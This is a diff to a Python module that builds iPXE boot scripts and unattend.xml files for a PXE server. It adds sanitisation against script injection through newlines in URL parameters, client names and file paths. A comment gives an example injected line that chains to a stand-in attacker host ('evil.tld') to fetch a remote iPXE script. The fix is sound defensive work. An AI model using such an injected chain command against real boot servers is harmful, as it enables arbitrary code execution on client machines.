@@ -2,12 +2,35 @@
 # -*- coding: utf-8 -*-
 
 import os
+import re
+import ipaddress
 from urllib.parse import unquote, urlencode
+from xml.sax.saxutils import escape as _xml_escape
 import configparser
 
 # 模块配置，由主程序初始化
 _SERVER_CONFIG = {}
 _CLIENT_MANAGER = None
+
+# =======================[ 输入消毒（防 iPXE 脚本注入） ]=======================
+# 背景：dynamic.ipxe 会把 URL 参数直接拼进 iPXE 脚本。
+# iPXE 以“行”为单位解析脚本，因此任何 CR/LF 都会让攻击者插入新的命令行
+# （例如 chain http://evil.tld/pwn.ipxe），从而在 PXE 客户端上执行任意代码。
+_CONTROL_CHARS_RE = re.compile(r"[\x00-\x1f\x7f]")
+_MAC_RE = re.compile(r"^[0-9A-Fa-f]{2}([-:][0-9A-Fa-f]{2}){5}$")
+
+def _sanitize_ipxe_value(value, max_len=255):
+    """移除换行与控制字符并截断长度，确保单个值不会跨行注入新的 iPXE 命令。"""
+    if value is None:
+        return ""
+    return _CONTROL_CHARS_RE.sub("", str(value))[:max_len].strip()
+
+def _is_valid_ip(value):
+    try:
+        ipaddress.ip_address(value)
+        return True
+    except (ValueError, TypeError):
+        return False
 
 # 定义所有支持扫描的启动文件扩展名
 SUPPORTED_EXTENSIONS = {'.wim', '.iso', '.efi', '.vhd', '.vhdx', '.vmdk', '.dsk', '.ima', '.img', '.ramos', '.iqn'}
@@ -151,7 +174,9 @@ def _generate_whoami_menu(http_uri: str) -> str:
     ]
     
     for client in unassigned_clients:
-        script.append(f"item {client['ip']} {client['name']} --- {client['ip']}")
+        safe_name = _sanitize_ipxe_value(client['name'], 64) or "unknown"
+        safe_ip = _sanitize_ipxe_value(client['ip'], 64)
+        script.append(f"item {safe_ip} {safe_name} --- {safe_ip}")
     
     script.extend([
         "",
@@ -217,8 +242,9 @@ def _generate_all_files_menu(http_uri: str) -> str:
 
     boot_files.sort()
     for path in boot_files:
+        safe_path = _sanitize_ipxe_value(path, 200)
         # 使用引号包围 item name，以支持带空格的文件名
-        script.append(f"item \"{path}\" \"{path}\"")
+        script.append(f"item \"{safe_path}\" \"{safe_path}\"")
 
     script.extend([
         "",
@@ -260,7 +286,7 @@ def _generate_ipxe_menu_from_config() -> str:
             item_name = f"item_{item_counter}"
             item_counter += 1
             
-            script.append(f"item {item_name} {menu_text}")
+            script.append(f"item {item_name} {_sanitize_ipxe_value(menu_text, 100)}")
 
             action = ""
             if not boot_file or boot_file.strip() == "":
@@ -324,11 +350,13 @@ def _generate_client_info_script(client_ip: str) -> str:
                     info['pcname'] = config.get(mac_norm, 'name', fallback='')
             except Exception: pass
 
+    # 注意：pcname 来自 ipxefm_cli.ini（可能被 TFTP 上传覆盖），必须消毒后再注入脚本
+    safe_values = {k: _sanitize_ipxe_value(v, 64) for k, v in info.items()}
     script = [
         "#!ipxe", "rem Predefined information about this machine",
-        f"set pcname {info['pcname']}", f"set ip {info['ip']}", f"set mask {info['mask']}",
-        f"set gateway {info['gateway']}", f"set dns1 {info['dns1']}",
-        f"set dns2 {info['dns2']}", f"set mac {info['mac']}",
+        f"set pcname {safe_values['pcname']}", f"set ip {safe_values['ip']}", f"set mask {safe_values['mask']}",
+        f"set gateway {safe_values['gateway']}", f"set dns1 {safe_values['dns1']}",
+        f"set dns2 {safe_values['dns2']}", f"set mac {safe_values['mac']}",
     ]
     return "\n".join(script)
 
@@ -357,7 +385,7 @@ def _generate_unattend_xml(client_ip: str) -> str:
 <unattend xmlns="urn:schemas-microsoft-com:unattend">    
     <settings pass="windowsPE">    
         <component name="Microsoft-Windows-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">    
-            <ComputerName>{computer_name}</ComputerName> 
+            <ComputerName>{_xml_escape(computer_name)}</ComputerName> 
             <EnableNetwork>true</EnableNetwork>    
             <EnableFirewall>false</EnableFirewall>    
         </component>    
@@ -374,14 +402,17 @@ def generate_dynamic_script(params: dict, client_ip: str) -> str:
     
     # 1. 优先处理绑定请求 (返回完整脚本)
     if 'myip' in params and 'mymac' in params:
-        ip_to_bind = params['myip'][0]
-        mac_to_bind = params['mymac'][0]
+        ip_to_bind = _sanitize_ipxe_value(params['myip'][0], 64)
+        mac_to_bind = _sanitize_ipxe_value(params['mymac'][0], 64)
+        # 严格校验，避免非法内容被回显到 iPXE 脚本中
+        if not _is_valid_ip(ip_to_bind) or not _MAC_RE.match(mac_to_bind):
+            return "#!ipxe\necho Invalid bind parameters (ip/mac rejected).\nsleep 3\nexit"
         return _perform_mac_binding(ip_to_bind, mac_to_bind)
 
     # 2. 其次处理 bootfile 参数
     bootfile = params.get('bootfile', [None])[0]
     if bootfile:
-        bootfile = unquote(bootfile).strip('"')
+        bootfile = _sanitize_ipxe_value(unquote(bootfile).strip('"'), 255)
         
         # 2a. 特殊功能关键字 (返回完整脚本)
         if bootfile.lower() == 'ipxemenu':
